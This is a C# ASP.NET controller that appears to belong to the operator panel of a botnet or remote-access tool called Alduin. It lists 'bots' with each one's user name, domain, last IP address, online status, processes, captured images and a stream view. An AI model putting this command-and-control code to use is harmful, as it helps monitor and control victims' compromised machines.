using System;
using System.Threading.Tasks;
using Alduin.Logic.Mediator.Commands;
using Alduin.Logic.Mediator.Queries;
using Alduin.Server.Modules;
using Alduin.Server.Services;
using Alduin.Web.Models;
using Alduin.Web.Models.Bot;
using Alduin.Web.Models.Commands.Commands;
using MediatR;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Localization;
using Newtonsoft.Json;

namespace Alduin.Web.Controllers
{
    public class ListController : ControllerBase
    {
        private readonly IMediator _mediator;
        private readonly IStringLocalizer<ListController> _localizer;
        private readonly GetBotImagesJsonServices _getBotImagesJsonServices;
        private readonly GetAllDeatilsServices _getalldeatilsservices;
        private readonly GetAllProcessServices _getallprocessservices;
        private readonly UpdateBotDeatilsService _updatebotdeatilsservice;
        public ListController(IMediator mediator, IStringLocalizer<ListController> localizer, GetBotImagesJsonServices getBotImagesJsonServices, GetAllDeatilsServices getalldeatilsservices, GetAllProcessServices getallprocessservices, UpdateBotDeatilsService updatebotdeatilsservice)
        {
            _mediator = mediator;
            _localizer = localizer;
            _getBotImagesJsonServices = getBotImagesJsonServices;
            _getalldeatilsservices = getalldeatilsservices;
            _getallprocessservices = getallprocessservices;
            _updatebotdeatilsservice = updatebotdeatilsservice;
        }
        [Authorize]
        public IActionResult Index()
        {
            return View();
        }
        [Authorize]
        public IActionResult List()
        {
            return View();
        }
        [Authorize]
        public async Task<IActionResult> BotList()
        {
            var query = new GetBotListQuery();
            var bot = await _mediator.Send(query);
            return Json(bot);
        }
        [Authorize]
        public async Task<IActionResult> BotGetDeatils(int id)
        {
            var query = new GetBotInfoByBotIdQuery
            {
                BotId = id
            };
            
            var result = await _mediator.Send(query);
            if(result.Length == 0)
            {
                var botDeatils = await _getalldeatilsservices.GetAllDeatils(id);
                await _updatebotdeatilsservice.Update(botDeatils, id);
                return Json(botDeatils);
            }
            else{
                return Json(result);
            }
            
        }
        [Authorize]
        public async Task<IActionResult> BotGetProcess(int id)
        {
            var botProcess = await _getallprocessservices.GetAllProcess(id);
            return Json(botProcess);
        }
        [Authorize]
        public async Task<IActionResult> Bot(int id)
        {
            try
            {
                appsettingsModel appsettings = JsonConvert.DeserializeAnonymousType(ServerFileManager.FileReader(GetPathes.Get_SolutionMainPath() + "/Alduin.Web/appsettings.json"), new appsettingsModel());
                var query = new GetBotByIdQuery
                {
                    Id = id
                };
                GetImgJsonModel ImagesJsonModel;
                try
                {
                    ImagesJsonModel = JsonConvert.DeserializeAnonymousType(await _getBotImagesJsonServices.GetAllImg(id), new GetImgJsonModel());
                }
                catch
                {
                    ImagesJsonModel = JsonConvert.DeserializeAnonymousType("{'Images':[]}", new GetImgJsonModel()); ;
                };
                var bot = await _mediator.Send(query);
                DateTime DateNowUTC = DateTime.UtcNow.AddMinutes(-5);
                var status = _localizer["Offline"];
                if (bot.LastLoggedInUTC >= DateNowUTC)
                    status = _localizer["Online"];
                var botInquiryDeatils = new BotDeatilsInquiryModel
                {
                    Name = bot.UserName,
                    Domain = bot.Domain,
                    LastIPAddress = bot.LastIPAddress,
                    LastLoggedInUTC = bot.LastLoggedInUTC,
                    Status = status,
                    KeyCertified = bot.KeyCertified,
                    KeyUnique = appsettings.Stump.KeyCertified
                };
                var botmodel = new BotModel
                {
                    newImagesJsonModel = ImagesJsonModel,
                    newBotDeatilsInquiryModel = botInquiryDeatils
                };
                ViewData["ID"] = id;
                return View(botmodel);
            }
            catch (Exception e)
            {
                return Content(e.ToString());
            };
        }
        [Authorize]
        public async Task<IActionResult> Stream()
        {
            var bots = new GetBotsByStatusQuery
            {
                status = false //offline
            };
            var botlist = await _mediator.Send(bots);
            var model = new StreamModel();
            for (int i = 0; i < botlist.Length; i++)
            {
                model.NewVariables[i].Domain = botlist[i].Domain;
                model.NewVariables[i].Name = botlist[i].UserName;
            }
            return View(model);
        }
    }
}